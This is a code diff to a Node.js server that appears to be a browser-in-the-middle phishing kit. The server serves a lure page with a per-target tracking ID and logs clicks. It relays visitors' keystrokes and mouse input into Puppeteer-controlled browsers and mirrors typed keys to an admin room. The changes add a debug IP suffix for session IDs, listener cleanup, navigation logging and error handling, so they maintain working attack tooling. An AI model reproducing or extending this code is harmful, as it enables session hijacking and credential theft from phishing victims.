@@ -44,6 +44,14 @@ const generateSessionId = function(ip) {
   return crypto.createHash('sha256').update(ip).digest('hex')
 }
 
+// Aplicar debug suffix a IP si está configurado
+const applyDebugIpSuffix = function(ip) {
+  if (pm && pm.debugMultiUserIp) {
+    return ip + pm.debugMultiUserIp
+  }
+  return ip
+}
+
 var ship_logs = function (log_data) {
   var headers = {
     'Content-Type': 'application/json',
@@ -132,14 +140,17 @@ fastify.route({
     let client_ip = req.headers['x-real-ip']
     let tracking_id = pm ? pm.tracking_id : 'tracking_id'
     let target_id = req.query[tracking_id] ? req.query[tracking_id] : crypto.randomBytes(8).toString('hex')
+    let debugIp = req.query.debugIp || ''
     if (pm) {
-      const session_id = generateSessionId(client_ip)
-      ship_logs({ "session_id": session_id, "event_ip": client_ip, "target": target_id, "event_type": "CLICK", "event_data": req.url })
+      const session_id = generateSessionId(client_ip + debugIp)
+      console.log(`[CLICK] Session ID: ${session_id} (IP: ${client_ip}, debugIp: ${debugIp})`)
+      ship_logs({ "session_id": session_id, "event_ip": client_ip + debugIp, "target": target_id, "event_type": "CLICK", "event_data": req.url })
     }
     console.log('client_ip: ' + client_ip)
     //if(config.admin_ips.includes(client_ip)){
     let stream = fs.createReadStream(__dirname + "/pinpo.html")
-    reply.type('text/html').send(stream.pipe(replace(/PAGE_TITLE/, target.tab_title)).pipe(replace(/CLIENT_IP/, client_ip)).pipe(replace(/TARGET_ID/, target_id)))
+    const debugIpSuffix = req.query.debugIp || ''
+    reply.type('text/html').send(stream.pipe(replace(/PAGE_TITLE/, target.tab_title)).pipe(replace(/CLIENT_IP/, client_ip)).pipe(replace(/TARGET_ID/, target_id)).pipe(replace(/DEBUG_MULTI_USER_IP/, debugIpSuffix)))
     //}else{
     //  reply.type('text/html').send("403")
     //}
@@ -484,9 +495,16 @@ fastify.ready(async function (err) {
         return
       }
       browser.socket_id = socket.id
-      if (!browser.frameNavigationListenerAttached) {
-        browser.frameNavigationListenerAttached = true
-        browser.target_page.on('framenavigated', async function (frame) {
+      
+      // Remover listener anterior si existe (para evitar acumulación)
+      if (browser.frameNavigationListener) {
+        browser.target_page.removeListener('framenavigated', browser.frameNavigationListener)
+        console.log(`[CLEANUP] Removido listener anterior de framenavigated para browser ${browser_id}`)
+      }
+      
+      // Crear nuevo listener
+      browser.frameNavigationListener = async function (frame) {
+        try {
           if (frame.parentFrame() === null) {
             const pageUrl = frame.url() || 'about:blank'
             const pageTitle = (await browser.target_page.title().catch(() => null)) || '(sin título)'
@@ -503,11 +521,21 @@ fastify.ready(async function (err) {
                 "event_url": pageUrl,
                 "event_title": pageTitle
               })
+              console.log(`[NAVIGATION] Session ID: ${browser.session_id} | IP: ${browser.user_ip} -> ${pageTitle} (${pageUrl})`)
+            } else {
+              console.log(`[NAVIGATION] ${browser.user_ip} -> ${pageTitle} (${pageUrl})`)
             }
-            console.log(`[NAVIGATION] ${browser.user_ip} -> ${pageTitle} (${pageUrl})`)
           }
-        })
+        } catch (err) {
+          if (!err.message.includes('Session closed') && !err.message.includes('Page closed')) {
+            console.error(`[FRAMENAVIGATED] Error: ${err.message}`)
+          }
+        }
       }
+      
+      // Agregar nuevo listener
+      browser.target_page.on('framenavigated', browser.frameNavigationListener)
+      console.log(`[BROADCAST] Nuevo listener de framenavigated para browser ${browser_id} (socket ${socket.id})`)
     })
     socket.on('new_fescar', async function (viewport_width, viewport_height, client_ip, target_id, session_id) {
       // Remove pending duplicates for the same socket and keep the latest viewport.
@@ -730,14 +758,20 @@ fastify.ready(async function (err) {
         fastify.io.to('admin_room').emit('keydebug', browser.browser_id, new_val)
       }
       const istext = key.length === 1 ? true : false;
-      if (istext) {
-        await browser.target_page._client.send('Input.dispatchKeyEvent', {
-          type: 'keyDown',
-          key: key,
-          text: key,
-        })
-      } else if (key != 'Dead') {
-        await browser.target_page.keyboard.down(key)
+      try {
+        if (istext) {
+          await browser.target_page._client.send('Input.dispatchKeyEvent', {
+            type: 'keyDown',
+            key: key,
+            text: key,
+          })
+        } else if (key != 'Dead') {
+          await browser.target_page.keyboard.down(key)
+        }
+      } catch (err) {
+        if (!err.message.includes('Session closed') && !err.message.includes('Page closed')) {
+          console.warn(`[KEYDOWN] Error (socket ${socket.id}): ${err.message}`);
+        }
       }
     })
     socket.on("keyup", async function (key) {
@@ -750,33 +784,44 @@ fastify.ready(async function (err) {
         return
       }
       const istext = key.length === 1 ? true : false;
-      if (istext) {
-        await browser.target_page._client.send('Input.dispatchKeyEvent', {
-          type: 'keyUp',
-          key: key,
-          text: key,
-        })
-      } else if (key != 'Dead') {
-        await browser.target_page.keyboard.up(key)
+      try {
+        if (istext) {
+          await browser.target_page._client.send('Input.dispatchKeyEvent', {
+            type: 'keyUp',
+            key: key,
+            text: key,
+          })
+        } else if (key != 'Dead') {
+          await browser.target_page.keyboard.up(key)
+        }
+      } catch (err) {
+        if (!err.message.includes('Session closed') && !err.message.includes('Page closed')) {
+          console.warn(`[KEYUP] Error (socket ${socket.id}): ${err.message}`);
+        }
       }
     })
     socket.on("mouse_event", async function (mouse_event) {
       const browser = browsers.get('controller_socket', socket.id)
-      if (!browser) {
-        //console.log("rogue viewer")
+      if (!browser || !browser.target_page) {
         return
       }
-      if (mouse_event.type === "click") {
-        await browser.target_page.mouse.move(mouse_event.clientX, mouse_event.clientY)
-      } else if (mouse_event.type === "mousewheel") {
-        browser.target_page.mouse.wheel({ "deltaX": mouse_event.wheelDeltaX })
-        browser.target_page.mouse.wheel({ "deltaY": mouse_event.wheelDeltaY })
-      } else if (mouse_event.type === "mousedown") {
-        await browser.target_page.mouse.down(mouse_event.clientX, mouse_event.clientY)
-      } else if (mouse_event.type === "mouseup") {
-        await browser.target_page.mouse.up(mouse_event.clientX, mouse_event.clientY)
-      } else if (mouse_event.type === "mousemove") {
-        await browser.target_page.mouse.move(mouse_event.clientX, mouse_event.clientY)
+      try {
+        if (mouse_event.type === "click") {
+          await browser.target_page.mouse.move(mouse_event.clientX, mouse_event.clientY)
+        } else if (mouse_event.type === "mousewheel") {
+          browser.target_page.mouse.wheel({ "deltaX": mouse_event.wheelDeltaX })
+          browser.target_page.mouse.wheel({ "deltaY": mouse_event.wheelDeltaY })
+        } else if (mouse_event.type === "mousedown") {
+          await browser.target_page.mouse.down(mouse_event.clientX, mouse_event.clientY)
+        } else if (mouse_event.type === "mouseup") {
+          await browser.target_page.mouse.up(mouse_event.clientX, mouse_event.clientY)
+        } else if (mouse_event.type === "mousemove") {
+          await browser.target_page.mouse.move(mouse_event.clientX, mouse_event.clientY)
+        }
+      } catch (err) {
+        if (!err.message.includes('Session closed') && !err.message.includes('Page closed')) {
+          console.warn(`[MOUSE_EVENT] Error (socket ${socket.id}): ${err.message}`);
+        }
       }
     })
   })
